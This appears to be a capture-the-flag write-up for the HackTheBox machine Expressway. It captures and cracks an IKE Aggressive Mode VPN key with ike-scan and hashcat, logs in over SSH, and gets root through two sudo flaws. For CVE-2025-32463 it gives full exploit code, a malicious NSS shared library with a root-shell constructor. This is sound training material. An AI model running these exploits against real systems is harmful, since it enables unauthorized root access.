---
icon: truck-fast
cover: ../../../../.gitbook/assets/Screenshot 2026-03-09 123136.png
coverY: 0.6848711872437303
---

# HTB-EXPRESSWAY

## Reconnaissance

#### Port Scanning

Starting with a full TCP scan using rustscan to get a quick picture of what's exposed.

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ rustscan -a 10.129.176.35 blah blah 
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

Only SSH. That's a pretty bleak starting point nothing web-facing, no FTP, no SMB. The OpenSSH version puts this on Debian Trixie (2025). Without credentials, TCP gives us nothing to work with.

Time to check UDP. Services like VPN daemons, TFTP, and SNMP only run on UDP and are commonly overlooked. This is worth the wait.

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ sudo nmap -sU --min-rate 10000 10.129.176.35
```

```
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp
4500/udp  open|filtered nat-t-ike
```

UDP 500 is ISAKMP — the control plane protocol for IPsec VPNs. Port 4500 alongside it confirms NAT Traversal support. This isn't a random open port; there's an entire VPN service running here. That's the attack surface.

TFTP on UDP 69 shows up too, but nmap can't tell much about it since TFTP has no banner and doesn't allow directory listing. I'll keep it in mind.

Pulling more detail on port 500:

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ sudo nmap -sU -p 500 -sCV 10.129.176.35
```

```
500/udp open  isakmp?
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0
```

XAUTH means this is an extended authentication VPN — it authenticates users on top of the base IPsec negotiation. Dead Peer Detection is just a keepalive mechanism. The important thing here is that XAUTH setups typically require a group identity to be sent in cleartext so the server can look up the right pre-shared key. That's the Aggressive Mode problem.

***

### IKE Enumeration — UDP 500

#### Understanding the Protocol Before Exploiting It

IKE has two negotiation modes and the distinction matters here.

In Main Mode, the full exchange is six packets. Identity gets encrypted before it's sent, so an eavesdropper learns nothing about who's authenticating. The server needs to know the PSK upfront though, which means it can only support a single PSK per IP address.

In Aggressive Mode, the exchange collapses to three packets. Identity is sent in the very first packet in plaintext — before any keys are exchanged — because the server needs to look up which PSK to use for a particular user or group. This makes it fast and flexible for multi-user VPN setups, but it means the identity leaks unconditionally, and so does the PSK hash. An attacker can capture that hash and crack it offline.

Expressway is running Aggressive Mode. Let's verify and pull the identity.

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ ike-scan 10.129.176.35
```

```
10.129.176.35   Main Mode Handshake returned HDR=(CKY-R=e87be20a68db8232) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

<figure><img src="../../../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

Main Mode responds and tells us the crypto: 3DES, SHA1, DH Group 2 (modp1024), PSK authentication. Session lasts 8 hours. Now let's hit it with Aggressive Mode:

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ ike-scan -A 10.129.176.35
```

```
10.129.176.35   Aggressive Mode Handshake returned HDR=(CKY-R=47b7c6c3686400a8) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```

<figure><img src="../../../../.gitbook/assets/image (601).png" alt=""><figcaption></figcaption></figure>

There it is — `ike@expressway.htb`. The identity is out in the open and the PSK hash is right there in the `Hash(20 bytes)` field. This is exactly the Aggressive Mode design flaw: by the time authentication is evaluated, the attacker already has everything they need to crack the password offline.

### Capturing the PSK Hash

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ ike-scan -A 10.129.176.35 --pskcrack=out.txt
```

```
10.129.176.35   Aggressive Mode Handshake returned HDR=(CKY-R=66937bae6c61c21c) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) ... Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.031 seconds. 1 returned handshake; 0 returned notify
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ cat out.txt
```

```
5f18934ade21c1ea878b43cb5dfbd15a6712c6b7e8059de5c761e96770992ec00cc936c14702418290f0234c59c22db26fb50511dda1f8b109a00312eff1b7a94eac0060a7af81a5ea0f875fa149390bfd656f705f75d5a9caf7b82164473bf6900a372e07157c818a7a61ea80dd55683e7e3e23658e974546c8a1daa7d9742c:4837a17dfc65579b94f1a9541706d23c5d05b7120404ba5661de2525d499ef9e2589cea69e4d5232c9bcecfa6a4d8337773e09e77db5ecb83c06c6f2cc285bb13faf57f0703ac4c0c3be94160eb21ba7c51424a0942959139248fb27194a51226491897e11fe0bc8039005efae6602999b0b32c902bde47cdbb44d224afd05e8:66937bae6c61c21c:56832105b4a63bf2:[...snip...]
```

<figure><img src="../../../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>

The hash format is `IKE-PSK SHA1`, hashcat mode **5400**. The structure is a colon-delimited blob containing both the initiator and responder cookies, the DH public values, and the HMAC hash itself — everything hashcat needs to reconstruct and verify the PSK offline.

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ hashcat out.txt /usr/share/wordlists/rockyou.txt
```

```
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5400 | IKE-PSK SHA1 | Network Protocol

[...snip...]

5f18934a[...snip...]:freakingrockstarontheroad

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Time.Started.....: [...]
Time.Estimated...: [...]
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
```

Cracked in 11 seconds. PSK is `freakingrockstarontheroad`. The PSK is also the user's SSH password — a common reuse pattern in VPN deployments where the same credential services both the tunnel and the host.

Or You can use `psk-crack`

#### PSK Cracking

**Command:**

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt out.txt
```

**Result:** The PSK was successfully cracked revealing the password: `freakingrockstarontheroad`

<figure><img src="../../../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

***

### Initial Access - Shell as ike

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ ssh ike@10.129.176.35
```

Password: `freakingrockstarontheroad`

<figure><img src="../../../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

```
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
[...]
ike@expressway:~$
```

***

### Post-Exploitation Enumeration

The home directory is bare. `.bash_history` is symlinked to `/dev/null` — standard CTF hygiene. No other user home directories exist and no additional shell users in `/etc/passwd` besides `root` and `ike`.

Checking sudo first instinct since we have the password:

```
ike@expressway:~$ sudo -l
[sudo] password for ike:
Sorry, user ike may not run sudo on expressway.
```

No direct sudo access on the local hostname. Interesting that it mentions "on expressway" — that phrasing hints at host-based restrictions in the sudoers config. Keep that in mind.

#### Two sudo Binaries

Looking at SUID binaries:

```
ike@expressway:~$ find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/sudo
/usr/local/bin/sudo
[...other standard binaries...]
```

<figure><img src="../../../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

Two copies of sudo. `/usr/local/bin/` is not where sudo lives by default — that path is for manually compiled or installed software. Checking versions:

```
ike@expressway:~$ /usr/bin/sudo --version
Sudo version 1.9.13p3

ike@expressway:~$ /usr/local/bin/sudo --version
Sudo version 1.9.17
```

<figure><img src="../../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

1.9.17 is newer and it was manually placed. These two versions cover different CVE ranges — this box is clearly built around a sudo vulnerability. A quick search on 1.9.17 turns up two recent CVEs that are cited everywhere: **CVE-2025-32462** and **CVE-2025-32463**.

### TFTP - Cisco Config

Earlier, nmap showed TFTP open. Without a file name, TFTP is useless — it has no directory listing. But there's a Cisco router config sitting in `/srv/tftp/ciscortr.cfg`:

```
ike@expressway:~$ cat /srv/tftp/ciscortr.cfg
```

```
version 12.3
[...snip...]
hostname expressway
[...snip...]
crypto isakmp client configuration group rtr-remote
        key secret-password
        dns 208.67.222.222
        domain expressway.htb
        pool dynpool
[...snip...]
```

The credentials are masked with `*****` throughout. But the config confirms the network topology — three VLANs (10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24), a VPN peer at `192.168.100.1`, and SSIDs named `cisco`, `ciscowep`, `ciscowpa`. The file is accessible externally too, since TFTP is exposed:

```
┌──(sn0x㉿sn0x)-[~/HTB/Expressway]
└─$ curl tftp://10.129.176.35/ciscortr.cfg -s | head
```

### Squid Logs — Hostname Discovery

Squid proxy is installed but not running. The logs in `/var/log/squid/` are old but contain something useful:

```
ike@expressway:~$ grep -r "expressway" /var/log/ 2>/dev/null
```

```
squid/access.log.1:1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

The hostname `offramp.expressway.htb`. This is a different hostname than the machine itself (`expressway.htb`). If the sudoers file defines host-based rules, this second hostname could be the key — the sudoers policy might grant `ike` root access on `offramp` while denying it on `expressway`.

***

## Privilege Escalation

### CVE-2025-32462 — Sudo Host Bypass

NIST: _"Sudo before 1.9.17p1, when used with a sudoers file that specifies a host that is neither the current host nor ALL, allows listed users to execute commands on unintended machines."_

This vulnerability affects versions 1.8.8 through 1.9.17 — both copies of sudo on this machine are in range.

**The vulnerable code path:** When a user passes `-h <hostname>`, vulnerable versions of sudo evaluate the user-supplied hostname against the sudoers policy instead of the actual system hostname. The intent is to allow administrators to impersonate other hosts in multi-host sudoers setups, but there's no check that the supplied hostname is actually the current machine. An attacker can spoof a permissive host alias to match a rule that was never meant to apply locally.

The sudoers file on this machine (readable as root, but the behavior reveals the intent):

```
Host_Alias     SERVERS        = expressway.htb, offramp.expressway.htb
Host_Alias     PROD           = expressway.htb
ike            SERVERS, !PROD = NOPASSWD:ALL
ike         offramp.expressway.htb  = NOPASSWD:ALL
```

The intent is clear: `ike` gets passwordless root on `offramp.expressway.htb` but NOT on `expressway.htb` (production is explicitly excluded). The flaw is that when we pass `-h offramp.expressway.htb`, sudo checks our spoofed hostname against the policy, matches the permissive rule, and grants root — despite us being physically on `expressway.htb` where it should be denied.

```
ike@expressway:~$ sudo -h offramp.expressway.htb id
uid=0(root) gid=0(root) groups=0(root)
```

One liner. Now a full root shell:

```
ike@expressway:~$ sudo -h offramp.expressway.htb -i
root@expressway:~#
```

<figure><img src="../../../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

Notably, this works on both sudo binaries — the vulnerability spans the entire 1.8.8–1.9.17 range. The system-installed `/usr/bin/sudo` adds a DNS resolution step first and hangs briefly, but ultimately also grants root when the DNS resolves (or times out).

***

### CVE-2025-32463 - Alternative Path (sudo --chroot NSS Library Injection)

NIST: _"Sudo before 1.9.17p1 allows local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option."_

This one only applies to versions 1.9.14–1.9.17, which means it only works against `/usr/local/bin/sudo` on this machine.

**The vulnerable code path:** In sudo 1.9.14, a change was introduced to resolve paths via `chroot()` while the sudoers policy was still being parsed. This means sudo enters an attacker-controlled chroot before it finishes evaluating security policy. Inside that chroot, it reads `/etc/nsswitch.conf` — a config file that tells the system which shared libraries to load for name resolution. If the attacker controls that file, they can point it to a malicious `.so` and get arbitrary code execution as root.

NSS (Name Service Switch) works by reading `/etc/nsswitch.conf` entries like `passwd: files ldap` and loading the corresponding shared library. `files` loads `libnss_files.so`, `ldap` loads `libnss_ldap.so`. A fake entry like `passwd: /GOKU` would cause glibc to construct the path `libnss_/GOKU.so.2` and try to load it.

**Manual exploitation:**

Setting up the working directory:

```
ike@expressway:~$ STAGE=$(mktemp -d)
ike@expressway:~$ cd $STAGE
```

Creating the directory structure:

```
ike@expressway:/tmp/tmp.AEMIRU8Jqx$ mkdir -p newroot/etc libnss_
```

Fake `nsswitch.conf` pointing to our malicious library name:

```
ike@expressway:/tmp/tmp.AEMIRU8Jqx$ echo "passwd: /GOKU" > newroot/etc/nsswitch.conf
```

The malicious shared library — a constructor that fires on load and spawns a root shell:

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void pwn(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
```

Compiling it into the expected path (`libnss_/GOKU.so.2`):

```
ike@expressway:/tmp/tmp.AEMIRU8Jqx$ gcc -shared -fPIC -o libnss_/GOKU.so.2 pwn.c
```

The `__attribute__((constructor))` annotation marks the function to run automatically when the library is loaded — no explicit call needed. `chroot()` doesn't change the current working directory, so the relative path `libnss_/GOKU.so.2` resolves from our current `$STAGE` directory, where we placed the compiled library.

Triggering it:

```
ike@expressway:/tmp/tmp.AEMIRU8Jqx$ /usr/local/bin/sudo --chroot newroot true
root@expressway:/#
```

Before `true` ever executes, sudo chroots into `newroot`, reads the fake `nsswitch.conf`, constructs the library path, loads `libnss_/GOKU.so.2`, and the constructor fires — dropping us to a root bash session.

This does not work with the system-installed `1.9.13p3` because the `--chroot` flag was not added until 1.9.14:

```
ike@expressway:/tmp/tmp.AEMIRU8Jqx$ /usr/bin/sudo --chroot newroot true
[sudo] password for ike:
sudo: you are not permitted to use the -R option with true
```

***

### Another Way of Exploitation

#### Exploitation Process

**Repository Cloning:**

```bash
git clone <https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git> && cd CVE-2025-32463_chwoot

```

**Script Upload:**

```bash
scp sudo-chwoot.sh ike@expressway.htb:/tmp/

```

**Permission Configuration:**

```bash
cd /tmp && chmod +x sudo-chwoot.sh

```

**Exploitation Execution:**

```bash
./sudo-chwoot.sh cat /root/root.txt

```

#### CVE-2025-32463 Mechanism

The exploit operates through several sophisticated steps:

1. **Temporary Environment Creation:**

```bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

```

1. **Malicious C Code Generation:**

```c
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}

```

1. **Fake NSS Configuration:**

```bash
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

```

1. **Exploit Trigger:**

```bash
sudo -R woot woot

```

The `-R` parameter causes sudo to chroot into the controlled environment, loading the malicious NSS library and executing the constructor function with root privileges.

### Attack Flow

```
10.129.176.35 (Expressway)
│
├─[UDP 500] IKE/ISAKMP service exposed
│       │
│       └─ Aggressive Mode enabled
│               │
│               └─ ike-scan -A leaks identity: ike@expressway.htb
│                       │
│                       └─ --pskcrack captures PSK hash (IKE-PSK SHA1, mode 5400)
│                               │
│                               └─ hashcat + rockyou.txt = freakingrockstarontheroad
│
├─[TCP 22] SSH login as ike:freakingrockstarontheroad
│       │
│       └─ user.txt captured
│
├─[Enumeration] /var/log/squid/access.log.1
│       │
│       └─ Hostname discovered: offramp.expressway.htb
│
├─[PrivEsc Path 1] CVE-2025-32462 — sudo -h hostname bypass
│       │
│       └─ sudo -h offramp.expressway.htb -i
│               │
│               └─ root shell (sudoers evaluates spoofed hostname)
│
└─[PrivEsc Path 2] CVE-2025-32463 — sudo --chroot NSS library injection
        │
        └─ Fake nsswitch.conf + malicious libnss_*.so.2
                │
                └─ /usr/local/bin/sudo --chroot newroot true
                        │
                        └─ root shell (constructor fires before policy check)
```

***

### Techniques

| Technique                                                    | Where Used                            |
| ------------------------------------------------------------ | ------------------------------------- |
| IKE Aggressive Mode PSK capture (`ike-scan --pskcrack`)      | UDP 500 enumeration                   |
| IKE-PSK SHA1 hash cracking (hashcat mode 5400)               | Cracking VPN PSK                      |
| Credential reuse (VPN PSK = SSH password)                    | Initial access as `ike`               |
| TFTP file retrieval (`curl tftp://`)                         | Cisco config discovery                |
| Log file grepping for hostname discovery                     | Finding `offramp.expressway.htb`      |
| CVE-2025-32462 — sudo `-h` hostname spoofing                 | Privilege escalation (primary path)   |
| CVE-2025-32463 — sudo `--chroot` NSS library injection       | Privilege escalation (alternate path) |
| Malicious shared library with `__attribute__((constructor))` | CVE-2025-32463 payload                |

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
